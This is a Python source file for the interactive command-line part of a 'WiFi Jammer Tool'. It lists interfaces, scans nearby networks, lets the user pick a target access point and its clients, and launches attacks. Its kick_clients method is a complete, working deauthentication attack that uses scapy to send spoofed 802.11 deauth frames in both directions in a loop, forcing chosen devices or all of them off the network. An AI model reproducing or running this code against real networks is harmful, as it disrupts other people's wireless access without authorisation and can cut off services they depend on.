"""Interactive CLI session coordinator.

Split from cli.py: :class:`WiFiJammerCLI` owns scanning UX, target/client
selection, inline client-kicking and live attack progress rendering, while
``cli.py`` keeps only Click command wiring.
"""

import os
import re
import signal
import subprocess
import sys
import threading
import time
from typing import Dict, List, Optional, Tuple

from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    Progress,
    SpinnerColumn,
    TextColumn,
    BarColumn,
    TimeElapsedColumn,
)
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich.live import Live

from wifi_jammer.core.interfaces import (
    AttackType,
    AttackConfig,
    IAttackStrategy,
    NetworkInfo,
)
from wifi_jammer.attacks.base_attack import AttackStats
from wifi_jammer.core.platform_interface import PlatformInterfaceFactory
from wifi_jammer.scanner import ScapyNetworkScanner
from wifi_jammer.factory import AttackFactory
from wifi_jammer.utils import RichLogger
from wifi_jammer.utils.platform_utils import is_windows, get_own_mac
from wifi_jammer.cli_display import AttackProgressDisplay


class WiFiJammerCLI:
    """Main CLI class for WiFi jamming tool."""

    def __init__(self) -> None:
        self.console = Console()
        self.logger = RichLogger()
        self.scanner = ScapyNetworkScanner(self.logger)
        self.factory = AttackFactory()
        self.current_attack: Optional["IAttackStrategy"] = None
        self.platform_interface = PlatformInterfaceFactory.create()
        self.progress_display: Optional[AttackProgressDisplay] = None
        self.live_display: Optional[Live] = None

    def check_root(self) -> bool:
        """Check if running as root. Returns True if root, False otherwise (warns but doesn't exit)."""
        if is_windows():
            # Windows - check for admin privileges
            try:
                import ctypes

                windll = getattr(ctypes, "windll", None)
                if windll is None or not windll.shell32.IsUserAnAdmin():
                    self.logger.warning(
                        "Some features may require administrator privileges on Windows."
                    )
                    return False
                return True
            except (AttributeError, OSError, ImportError):
                self.logger.warning("Could not check Windows privileges.")
                return False
        else:
            # Unix-like systems
            if os.geteuid() != 0:
                self.logger.warning(
                    "⚠️  Some features require root privileges. Run with sudo for full functionality."
                )
                self.logger.info(
                    "   Note: Network scanning may work without root, but attacks typically require root."
                )
                return False
            return True

    def show_banner(self) -> None:
        """Display tool banner."""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                    WiFi Jammer Tool                          ║
║              Advanced WiFi Jamming Utility                   ║
║                    By Paijo - v1.0.0                        ║
╚══════════════════════════════════════════════════════════════╝
        """
        self.console.print(Panel(banner, style="cyan"))

    def list_interfaces(self) -> Optional[List[str]]:
        """List available wireless interfaces."""
        # Get all interfaces first
        all_interfaces = self.platform_interface.get_all_interfaces()
        wireless_interfaces = self.platform_interface.get_wireless_interfaces()

        if not all_interfaces:
            self.logger.error("No network interfaces found!")
            return None

        # Create table with all interfaces
        table = Table(title="Available Network Interfaces")
        table.add_column("Interface", style="cyan")
        table.add_column("Status", style="green")
        table.add_column("Type", style="blue")
        table.add_column("MAC Address", style="yellow")
        table.add_column("Capabilities", style="magenta")

        # Add all interfaces to table
        for iface in all_interfaces:
            capabilities = (
                ", ".join(iface.capabilities) if iface.capabilities else "None"
            )
            table.add_row(
                iface.name, iface.status, iface.type, iface.mac_address, capabilities
            )

        self.console.print(table)

        # Return only wireless interface names for further use
        wireless_names = [
            iface.name for iface in wireless_interfaces if iface.status == "Available"
        ]

        if not wireless_names:
            self.logger.warning("No available wireless interfaces found!")
            self.logger.info(
                "This tool requires wireless interfaces for full functionality."
            )
            return []

        return wireless_names

    def scan_networks(
        self, interface: str, channel: Optional[int] = None
    ) -> List["NetworkInfo"]:
        """Scan for available networks."""
        self.logger.info(f"Scanning networks on {interface}...")

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console,
        ) as progress:
            task = progress.add_task("Scanning...", total=None)
            networks = self.scanner.scan_networks(interface, channel)
            progress.update(task, completed=True)

        return networks

    def display_networks(self, networks: List["NetworkInfo"]) -> None:
        """Display scanned networks in a table."""
        if not networks:
            self.logger.warning("No networks found!")
            return

        table = Table(title="Available Networks")
        table.add_column("SSID", style="cyan")
        table.add_column("BSSID", style="yellow")
        table.add_column("Channel", style="green")
        table.add_column("RSSI", style="red")
        table.add_column("Encryption", style="blue")

        for network in networks:
            table.add_row(
                network.ssid or "Hidden",
                network.bssid,
                str(network.channel),
                f"{network.rssi} dBm",
                network.encryption,
            )

        self.console.print(table)

    def select_network(self, networks: List["NetworkInfo"]) -> Optional["NetworkInfo"]:
        """Let user select a target network."""
        if not networks:
            return None

        choices = []
        for i, network in enumerate(networks, 1):
            choice = f"{i}. {network.ssid or 'Hidden'} ({network.bssid}) - Ch{network.channel}"
            choices.append(choice)

        self.console.print("\nSelect target network:")
        for choice in choices:
            self.console.print(f"  {choice}")

        while True:
            try:
                selection = Prompt.ask("Enter number", default="1")
                index = int(selection) - 1
                if 0 <= index < len(networks):
                    return networks[index]
                else:
                    self.logger.error("Invalid selection!")
            except ValueError:
                self.logger.error("Please enter a valid number!")

    def select_attack(self) -> AttackType:
        """Let user select attack type."""
        attacks = self.factory.get_available_attacks()

        self.console.print("\nAvailable attacks:")
        for i, attack in enumerate(attacks, 1):
            self.console.print(f"  {i}. {attack.value}")

        while True:
            try:
                selection = Prompt.ask("Select attack type", default="1")
                index = int(selection) - 1
                if 0 <= index < len(attacks):
                    return attacks[index]
                else:
                    self.logger.error("Invalid selection!")
            except ValueError:
                self.logger.error("Please enter a valid number!")

    def configure_attack(self, attack_type: AttackType) -> AttackConfig:
        """Configure attack parameters."""
        config = AttackConfig(
            attack_type=attack_type, target_bssid="", target_ssid="", channel=0
        )

        # Get target BSSID
        config.target_bssid = Prompt.ask("Target BSSID")

        # Get interface
        interfaces = self.scanner.get_interface_list()
        if interfaces:
            config.interface = Prompt.ask("Interface", default=interfaces[0])

        # Get channel
        channel = Prompt.ask("Channel", default="0")
        config.channel = int(channel) if channel.isdigit() else 0

        # Get packet count
        count = Prompt.ask("Packet count (0 for unlimited)", default="0")
        config.count = int(count) if count.isdigit() else 0

        # Get delay
        delay = Prompt.ask("Delay between packets (seconds)", default="0.1")
        config.delay = float(delay)

        # Get source MAC
        config.source_mac = Prompt.ask("Source MAC (random if empty)", default="")

        # Verbose mode
        config.verbose = Confirm.ask("Verbose mode?")

        return config

    def discover_clients(
        self,
        interface: str,
        ap_bssid: str,
        channel: Optional[int] = None,
        duration: int = 30,
    ) -> Tuple[Dict[str, float], Optional[str]]:
        """Discover clients connected to the AP."""
        my_mac = get_own_mac(interface)

        # Use scanner's client scanning method
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=self.console,
        ) as progress:
            task = progress.add_task(f"Scanning for {duration}s...", total=duration)

            def update_progress() -> None:
                for _ in range(duration):
                    time.sleep(1)
                    progress.update(task, advance=1)

            progress_thread = threading.Thread(target=update_progress)
            progress_thread.start()

            # Use scanner's scan_clients method
            clients = self.scanner.scan_clients(interface, ap_bssid, channel, duration)
            progress_thread.join()

        return clients, my_mac

    def select_clients_to_kick(self, clients: Dict[str, float]) -> List[str]:
        """Let user select which clients to kick."""
        if not clients:
            self.logger.warning("No clients discovered")
            return []

        # Display discovered clients
        table = Table(title=f"Discovered Clients ({len(clients)})")
        table.add_column("#", style="cyan")
        table.add_column("MAC Address", style="yellow")
        table.add_column("Last Seen", style="green")

        client_list = list(clients.items())
        for i, (mac, last_seen) in enumerate(client_list, 1):
            age = time.time() - last_seen
            table.add_row(str(i), mac, f"{age:.1f}s ago")

        self.console.print(table)

        self.console.print("\n[bold]Kick Options:[/bold]")
        self.console.print("  [cyan]all[/cyan] - Kick all discovered clients")
        self.console.print(
            "  [cyan]1,2,3[/cyan] - Kick specific clients (comma-separated)"
        )
        self.console.print("  [cyan]none[/cyan] - Skip client kicking")

        selection = Prompt.ask("Select clients to kick", default="all")

        if selection.lower() == "none":
            return []
        elif selection.lower() == "all":
            return [mac for mac, _ in client_list]
        else:
            try:
                indices = [int(x.strip()) - 1 for x in selection.split(",")]
                return [client_list[i][0] for i in indices if 0 <= i < len(client_list)]
            except (ValueError, IndexError):
                self.logger.error("Invalid selection")
                return []

    def kick_clients(
        self,
        interface: str,
        ap_bssid: str,
        target_clients: List[str],
        duration: int = 60,
    ) -> None:
        """Kick specific clients using deauth packets."""
        from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
        from scapy.sendrecv import sendp

        if not target_clients:
            return

        self.logger.info(
            f"Kicking {len(target_clients)} clients for {duration} seconds..."
        )
        self.console.print("[yellow]Press Ctrl+C to stop early[/yellow]")

        start_time = time.time()
        count = 0

        try:
            with Live(
                self.console.status("[bold green]Sending deauth packets..."),
                console=self.console,
            ) as live:
                while time.time() - start_time < duration:
                    for target_mac in target_clients:
                        # Bidirectional deauth
                        pkt_to_client = (
                            RadioTap()
                            / Dot11(addr1=target_mac, addr2=ap_bssid, addr3=ap_bssid)
                            / Dot11Deauth(reason=7)
                        )

                        pkt_to_ap = (
                            RadioTap()
                            / Dot11(addr1=ap_bssid, addr2=target_mac, addr3=ap_bssid)
                            / Dot11Deauth(reason=7)
                        )

                        sendp(pkt_to_client, iface=interface, verbose=False)
                        sendp(pkt_to_ap, iface=interface, verbose=False)
                        count += 2

                    if count % 50 == 0:
                        elapsed = time.time() - start_time
                        live.update(
                            f"[bold green]Sent {count} packets to {len(target_clients)} clients ({elapsed:.1f}s)"
                        )

                    time.sleep(0.1)
        except KeyboardInterrupt:
            self.logger.info("Stopped by user")

        self.logger.success(f"Attack complete. Sent {count} deauth packets")

    def progress_callback(self, stats: "AttackStats") -> None:
        """Callback for progress updates."""
        if self.progress_display:
            self.progress_display.update_stats(stats)

    def start_attack(self, config: AttackConfig) -> None:
        """Start the attack with real-time progress display."""
        try:
            attack = self.factory.create_attack(config.attack_type)
            self.current_attack = attack

            # Set up progress callback
            attack.set_progress_callback(self.progress_callback)

            if attack.execute(config):
                self.logger.success("Attack started successfully!")

                # Create progress display
                self.progress_display = AttackProgressDisplay(self.console)

                # Start live display
                with Live(
                    self.progress_display.get_layout(), refresh_per_second=2
                ) as live:
                    self.live_display = live

                    try:
                        while attack.is_running():
                            time.sleep(0.5)
                    except KeyboardInterrupt:
                        self.stop_attack()

            else:
                self.logger.error("Failed to start attack!")

        except Exception as e:
            self.logger.error(f"Error starting attack: {e}")

    def stop_attack(self) -> None:
        """Stop the current attack."""
        if self.current_attack and self.current_attack.is_running():
            self.current_attack.stop()
            self.logger.info("Attack stopped by user")

    def signal_handler(self, signum: int, frame: Optional[object]) -> None:
        """Handle interrupt signals."""
        self.stop_attack()
        sys.exit(0)

